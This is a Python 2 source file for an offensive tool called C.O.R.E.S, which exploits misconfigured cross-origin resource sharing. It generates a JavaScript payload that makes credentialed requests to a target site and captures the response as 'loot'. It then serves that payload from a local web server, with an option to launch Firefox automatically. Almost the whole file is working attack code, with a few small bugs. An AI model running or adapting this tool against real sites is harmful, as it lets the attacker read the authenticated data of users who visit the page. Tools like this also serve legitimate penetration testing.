#!/usr/bin/env python2
# C.O.R.E.S
# Cross-Origin Resource Exploitation Server
try:
	# from httpserver import HTTPServer
	import os, sys, time, signal, argparse
	from argparse import RawTextHelpFormatter
	# IP Query
	import json, urllib, socket
	# Simple HTTP Server
	import SocketServer, SimpleHTTPServer, multiprocessing
	# Browser Launch
	import webbrowser
	# Custom theme
	from theme import *
except Exception as e:
	print('\n' + string(e))
	sys.exit(1)

App = ' CORES '
Version = 'v1.03312017'
Author = 'Nick Sanzotta/@Beamr'
Contributors = 'Bill Harshbarger'

def parse_args():
	''' CLI Argument Options'''
	cls()
	# Custom Usage
	msg = """cores.py cores.py <URL> <OPTIONS>
	Example: python cores.py https://site.com/
	Example: python cores.py https://site.com/ -m GET -p 8080 -s alert -v -a\n
         [-m, Define HTTP request method ex: -m POST]
         [-p, Define HTTP Server port ex: -p 8080]
         [-a, Auto-launches FireFox to automatically visit destination server.]

         [-s, Define Log style ex: JavaScript Alert / Inner HTML ]
        """
	# Create Parser
	parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=' '+
		str(banner(App, Version, Author, Contributors)), usage=msg)	
	# Positional Arguments
	url_group = parser.add_argument_group(colors.green + ' URL options' + colors.normal)
	url_group.add_argument('url', type=str, metavar='URL [http://site.com/]', #required=True,
		help='Define vulnerable CORS targert URL ex: https://site.com/')
	url_group.add_argument('-m', type=str, metavar='GET', nargs='?', const=1, default = 'GET', #required=True,
		help='Define HTTP request method [GET, HEAD, POST] ex: -m POST\n')
	url_group.add_argument('-p', type=int, metavar='80', nargs='?', const=1, default = 80, 
		help='Define HTTP Server Port ex: -p 8080')
	# Style Arguments
	style_group = parser.add_argument_group(colors.green + ' Log style options' + colors.normal)
	style_group.add_argument('-s', type=str, metavar='alert, html', nargs='?', const=1, default = 'html', #required=True,
		help='ex: -s html   Displays logs in generated HTML.\n'+
			 'ex: -s alert  Displays logs in JavaScript Alert function.')
	# Browser Auto Launch Arguments
	autolaunch_group = parser.add_mutually_exclusive_group()
	autolaunch_group.add_argument('-a',action='store_true', #required=True,
		help='Enables FireFox to auto-launch.')
	# ME/Verbose Arguments
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-v','--verbose',action='store_true',
		help='Turn on Verbosity (Displays JavaScript code in STDOUT)\n')
	# Parse/Return the Arguments
	args = parser.parse_args()
	return args

def dir_check(directory):
	''' If specified directory does not exists then create specified directory '''
	if not os.path.exists(directory):
		print(' ['+colors.red +'!'+colors.normal+']'+' Directory not found: ' + directory) 
		os.makedirs(directory)
		print(' ['+colors.green +'*'+colors.normal+']'+' Created Directory: ' + directory)	

def get_external_address():
	''' Obtains External IP Address '''
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	return data["ip"]

def get_internal_address():
	''' Obtains Internal IP Address '''
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	return s.getsockname()[0]

def browser_launch(url, port):
	''' Auto Launches Firefox '''
	try:
	    browser_path = "/usr/bin/firefox %s"  
	except:
	    print("Firefox not found!")
	webbrowser.get(str(browser_path)).open(url+":"+str(port)+"/")

def cors_js_template(style, method, url, filename):
	'''1. Create CORS template for JavaScript Payload '''
	'''2. Write CORS template to file '''
	if style == 'html':
		cors_js_template = """
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('{0}','{1}',true);
		req.withCredentials = true;
		req.send();
		function reqListener() {{
		 	document.getElementById("loot").innerHTML = (this.responseText);
		 }};"""
	else:
		cors_js_template = """
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('{0}','{1}',true);
		req.withCredentials = true;
		req.send();
		function reqListener() {{
		 	window.alert(this.responseText);
		 }};"""
	cors_js = cors_js_template.format(method, url)
	with open(filename, 'w+') as f1:
		f1.write(cors_js)
	return cors_js

def html_template(javascript, filename):
	'''1. Create HTML template for index.html '''
	'''2. Write index.html to file '''
	filename = filename
	html_template = """
	<!DOCTYPE HTML>
	<html lang="en-US">
	<title>C.O.R.E.S</title>
	<head></head>
  		<body>
  			<p style="margin-left: 55px">
  			<b>Cross-Origin Resource Exploitation Server</b><br>
 			CORES {0}<br>
 			Description:Cross-Origin Resource Exploitation Server.<br>
 			Created by: Nick Sanzotta/@Beamr<br></p>
  			
  			<p style="margin-left: 55px">
  			<b>Logs:</b></p>
			<p style="margin-left: 55px", id="loot"></p>
				<script src="js/cors.js"></script>
		</body>
  	</html>"""
  	html_indexPage = html_template.format(Version, Contributors)
  	with open(filename, 'w+') as f2:
  		f2.write(html_indexPage)
  	return html_indexPage

def server_kill():
	try:
		# print('Trying to stop server process %s' % str(serverPid))
		os.kill(int(serverPid),9)
	except Exception as e:
		print(e)

def sigterm_handler(signal, frame):
	server_kill()

def sigint_handler(signal, frame):
	print('\nCaught Ctrl+C')
	print('Press Enter to close')
	server_kill()

def server_start(port):
	'''Starts Python's SimpleHTTPServer on specified port'''
	httpPort = int(port)
	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	httpd = SocketServer.TCPServer(("",httpPort), Handler, bind_and_activate=False)
	httpd.allow_reuse_address = True
	server_process = multiprocessing.Process(target=httpd.serve_forever)
	server_process.daemon = False
	try:
		httpd.server_bind()
		httpd.server_activate()
	except:
		httpd.server_close()
	# Create process
	server_process.start()

	global serverPid
	serverPid=server_process.pid

if __name__ == '__main__':
	# return args
	args = parse_args()
	# Banner
	cls()
	banner(App, Version, Author, Contributors)
	# Staging variables for JS
	js_name = 'cors.js'
	js_dir = str(os.path.expanduser('js/'))
	js_path = os.path.join(js_dir, js_name)
	# Check for js dir
	dir_check(js_dir)
	# Staging variables for HTML
	html_name = 'cors.html'
	html_dir = str(os.path.expanduser(''))
	html_path = os.path.join(html_dir, html_name)	
	
	# Connectivity Check
	try:
		extipAddress = get_external_address()
	except IOError:
		print(red('!')+ 'Check your Internet connection')
		pass #CHECK
	# Obtain Internal IP Address	
	ipAddress = get_internal_address()
	
	# Create payload file
	cors_js = cors_js_template(args.s.lower(), args.m, args.url, js_path)
	html_indexPage = html_template(cors_js, html_path)

	# Check for (-v)erbose
	if args.verbose:
		print(html_indexPage)
	else:
		pass
	# Start server
	server_start(args.p)
	print(blue('i')+ 'Target URL:  '+ args.url)
	print(blue('i')+ 'HTTP Server: http://%s:%s/%s' %(ipAddress, args.p, html_name))
	print('\n')

	# Check for (-a)uto Launch
	if args.a:
		browser_launch(ipAddress, args.p)
	else:
		pass
	# Catch ^C sigint
	signal.signal(signal.SIGINT, sigint_handler)
	signal.signal(signal.SIGTERM, sigterm_handler)
	# Manual Close/Exit
	raw_input('Press Enter to close\n\n')
	server_kill()

